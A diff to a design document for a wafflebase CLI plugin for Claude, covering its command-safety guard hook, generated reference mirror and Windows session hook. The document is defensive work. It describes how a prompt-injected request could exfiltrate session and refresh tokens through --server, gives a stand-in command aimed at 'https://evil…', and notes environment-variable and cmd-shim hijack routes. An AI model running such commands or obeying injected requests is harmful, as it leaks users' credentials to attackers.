@@ -90,10 +90,11 @@ plugins/wafflebase/
 │   ├── session-start.mjs / session-lib.mjs   # CLI presence, login state, web origin
 │   ├── guard.mjs / guard-lib.mjs      # entry / decision logic
 │   └── command-safety.json            # GENERATED from the CLI
+├── references/                        # GENERATED mirror of packages/cli/skills/
 └── skills/
     ├── wafflebase/                    # core: setup, find, read, safety, links
-    ├── wafflebase-sheets/             # + references/ (GENERATED copies)
-    ├── wafflebase-docs/               #   (docs and markdown notes)
+    ├── wafflebase-sheets/
+    ├── wafflebase-docs/               # (docs and markdown notes)
     ├── wafflebase-slides/
     ├── find/                          # /wafflebase:find <query>
     ├── publish/                       # /wafflebase:publish <file> [title]
@@ -118,16 +119,17 @@ the committed copy is stale:
 
 1. **`hooks/command-safety.json`** — built by walking the real commander
    tree (`createProgram()` + every `register*Command`), not the registry
-   alone, so command aliases (`doc`, `tab`, top-level `import`) are
+   alone, so command aliases (`doc`, `tab`, `image`) are
    classified under every spelling a user can type. Each leaf path is
    joined to its schema entry's `safety` and `variants`. A leaf with no
    schema entry fails the test: an unclassified command is exactly the
    case the guard must never meet.
-2. **`skills/*/references/*.md`** — byte copies of
-   `packages/cli/skills/*.md`, which stays the single source (the CLI's
-   own agent docs and `agentic-office-workflow.md` already point there).
-   `PLUGIN_REFERENCES` maps each file to one plugin skill; a CLI skill
-   with no mapping fails the test, so a new one cannot be forgotten.
+2. **`references/`** — a byte mirror of `packages/cli/skills/`, which
+   stays the single source (the CLI's own agent docs and
+   `agentic-office-workflow.md` already point there). A mirror rather than
+   per-skill copies, because those files link to each other by relative
+   path; the test asserts the directory lists exactly the source's files,
+   so a removed CLI skill cannot linger.
 3. **`version` in `plugin.json`** — the CLI's version. The plugin ships in
    lockstep with the CLI whose commands it classifies, so a release that
    bumps the CLI regenerates the plugin in the same commit.
@@ -205,7 +207,15 @@ Three root options are not skipped: `--server`, `--api-key` and
 the CLI sends the saved session (and, on a 401, the refresh token) to
 whatever `--server` names. A read with one of them always asks — this is
 the path a prompt-injected "list docs from https://…" would take to
-exfiltrate the user's tokens.
+exfiltrate the user's tokens. Their environment spellings
+(`WAFFLEBASE_SERVER=`, `WAFFLEBASE_API_KEY=`, `WAFFLEBASE_CONFIG=`, any
+`WAFFLEBASE_*`, and `HOME=`, which moves the config directory) ask the
+same way; the prompt names the server but never echoes a key.
+
+Payload-conditional variants (`a value is null`) are checked when the
+payload is an inline `--data` the guard can parse: `cells batch --data
+'{"A1":"x"}'` stays a write, `{"A1":null}` deletes a cell and is
+destructive. A payload on stdin is unseen, so the variant is assumed.
 
 ### Session hook (`SessionStart`)
 
@@ -239,7 +249,7 @@ Deep links follow the frontend routes: `/s/:id` sheet, `/d/:id` doc,
 | `wafflebase-docs` | Reading as Markdown, DOCX import/export, PDF export, notes (Markdown in / out), and why docs edits are a backed-up whole replace today |
 | `wafflebase-slides` | Deck outline reads, slide add/duplicate/move/delete, PPTX import/export |
 
-Each domain skill links its `references/` copies rather than restating
+Each domain skill links into `references/` rather than restating
 command syntax, so the CLI skill files remain the one place syntax lives.
 
 ### Commands
@@ -276,10 +286,12 @@ command syntax, so the CLI skill files remain the one place syntax lives.
   fetches the whole repository once. Acceptable for a first audience of
   developers; a slim `wafflebase/claude-plugins` repository (or an npm
   plugin source) is the move if that becomes a complaint.
-- **Windows.** The session hook spawns `wafflebase.cmd` through a shell,
-  since `npm i -g` installs a `.cmd` shim there that `execFile` will not
-  run; a missing CLI then reads as "status failed" rather than "not
-  installed", which still sends Claude to check before doing anything.
+- **Windows.** `npm i -g` installs a `wafflebase.cmd` shim, which Node
+  only runs through cmd.exe — and cmd.exe resolves a bare name from the
+  current directory before PATH, so a cloned repository shipping its own
+  `wafflebase.cmd` would have run at session start. The hook walks PATH
+  itself (absolute entries only, never the cwd) and spawns the shim by
+  absolute path; not finding it means "not installed".
 - **Credential exfiltration through `--server`.** Self-review found the
   first guard auto-allowing `wafflebase --server https://evil… docs list`,
   which sends the session JWT — and on a 401 the refresh token — to that
